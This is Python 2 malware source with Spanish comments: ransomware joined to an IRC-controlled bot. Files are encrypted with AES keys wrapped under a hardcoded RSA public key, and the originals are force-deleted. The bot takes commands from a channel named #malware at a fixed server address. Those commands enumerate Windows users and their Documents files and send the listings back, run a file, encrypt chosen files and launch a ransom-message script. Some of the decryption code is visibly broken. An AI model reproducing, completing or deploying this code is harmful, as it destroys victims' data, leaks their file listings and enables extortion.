import sys
import socket
import random
import os
import subprocess
import string
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
import Crypto
from Crypto.PublicKey import RSA
from Crypto import Random

rsa_str = '-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDwlbp/XRIkDF8sKfjsk3mKpYxI5ljpO1mn+SOvJb/M18AhGzv6ViDDYzwmcFlASiEvnqKdLTC2W6F+mgzhIu8Aft0ZAi2aIJ2yU2TPR5MOxq55vzXulRF71hyy4sJVIXa8Q11XJJyzm5pmkbrmiaCZIOABzyf5WTcbepSq0I6dSQIDAQAB\n-----END PUBLIC KEY-----'
rsa = RSA.importKey(rsa_str)

def Cifra(fnamec):
	"""
	Recibe: La llave para cifrar el archivo y el nombre del archivo
	Devuelve: Archivo cifrado usando AES como metodo de cifrado
	"""
	key = CreaLlave()
	chunksize=64*1024
	outputfile=fnamec+'.ggez'
	filesize=str(os.path.getsize(fnamec)).zfill(16)
	IV=''
	llave_cifrada = CifraLlave(key)[0]
	#print 'Logitud de la llave:',len(llave_cifrada)
	for i in range(16):
		IV+=chr(random.randint(0,0xff))
	encryptor= AES.new(key, AES.MODE_CBC,IV)

	with open(fnamec, 'rb') as infile:
		with open(outputfile, 'wb') as outfile:
			outfile.write(filesize)
			outfile.write(IV)
			outfile.write(llave_cifrada)

			while True:
				chunk =infile.read(chunksize)
				if len(chunk)==0:
					break
				elif len(chunk) % 16 !=0:
					chunk+=' '*(16-(len(chunk)%16))
				outfile.write(encryptor.encrypt(chunk))
	os.system('del /F /Q /A '+fnamec)

def Descifra(key, fnamec):
	"""
	Recibe: La llave para descifrar el archivo y el nombre del archivo
	Devuelve: Archivo descifrado usando AES como metodo de descifrado
	"""
	chunksize = 64*1024
	outputFile = fnamec.replace('.ggez','')
	
	with open(fnamec, 'rb') as infile:
		filesize = long(infile.read(16))
		IV = infile.read(16)
		llave_cifrada = ifile.read(128)
		#Descifrar la llave AES con la llave privada RSA
		decryptor = AES.new(key, AES.MODE_CBC, IV)

		with open(outputFile, 'wb') as outfile:
			while True:
				chunk = infile.read(chunksize)

				if len(chunk) == 0:
					break

				outfile.write(decryptor.decrypt(chunk))
			outfile.truncate(filesize)


def CreaLlave():
	"""
	Recibe: Un texto plano que servira ser una llave
	Devuelve: Una llave de tamano constante la cual servira para cifrar el archivo
	"""
	abcd = string.ascii_lowercase
	k = ''.join(random.choice(abcd) for i in range(random.randint(16,64)))
	hasher=SHA256.new(k)
	return hasher.hexdigest()[:16]

	
def CifraLlave(llave):
	return rsa.encrypt(llave,32)

def botName():
    values = list("123456789")
    L1=random.choice(values)
    L2=random.choice(values)
    L3=random.choice(values)
    L4=random.choice(values)

    name = "Bot"+ L1 + L2 + L3 + L4
    return name

def users():
    usersDir = os.listdir('C:\\Users')
    userDefault = ('All Users','Default','Default User','DefaultAppPool','Public','desktop.ini')
    users = []
    for element in usersDir:
        if element not in userDefault:
            users.append(element)
            print element
    return users

def files(user):
    docsPath = "C:\\Users\\"+ user +"\\Documents"
    docsFiles = os.listdir(docsPath)
    FilesWithPath = []
    for file in docsFiles:
        filePath = docsPath +"\\"+ file
        FilesWithPath.append(filePath)
    msg = "Archivos de %s en Documents\n" %user
    for file in FilesWithPath:
        msg += file+"\n"
    print msg
    return FilesWithPath

server="192.168.1.30"
botnick=botName()
channel="#malware"

irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.connect((server,6667))
irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :r\r\n")
irc.send("NICK "+ botnick +"\n")
irc.send("JOIN "+ channel +"\n")

while 1:
    try:
        msg=irc.recv(2048)
        #print(msg)
    except Exception:
        pass
    if msg.find("PING")!=-1:
        irc.send("PRIVMSG "+channel+" :PONG!\r\n")
    if msg.find("!@PING")!=-1:
        irc.send("PRIVMSG "+channel+" :PONG!\r\n")
    if msg.lower().find("!@hi")!=-1:
        irc.send("PRIVMSG "+channel+" :Hello!\r\n")
    if msg.find("!@run")!=-1:
        subprocess.call(['C:\\test.txt'])
    if msg.find("!@users")!=-1:
        users = users()
        for user in users:
            irc.send("PRIVMSG "+channel+" %s\r\n" %user)
    if msg.find("!@files")!=-1:
        user = msg.split(' ')[4]
        FilesWithPath = files(user[:-2])
        for file in FilesWithPath:
            irc.send("PRIVMSG "+channel+" %s\r\n" %file)
    if msg.find("!@cifraArchivo") != -1:
        irc.send("PRIVMSG "+channel+" :Cifrando...\r\n")
        msg2=msg.split(' ')
	try:
	    Cifra(msg2[4].replace('\r\n',''))
	    irc.send("PRIVMSG "+channel+" :El archivo fue cifrado correctamente ;)\r\n")
	    proc = subprocess.Popen([sys.executable, "mensaje.py"])
            proc.communicate()
        except Exception as e:
            irc.send("PRIVMSG "+channel+" :"+str(e)+"\r\n")
    # Limpio el msg
    msg=""
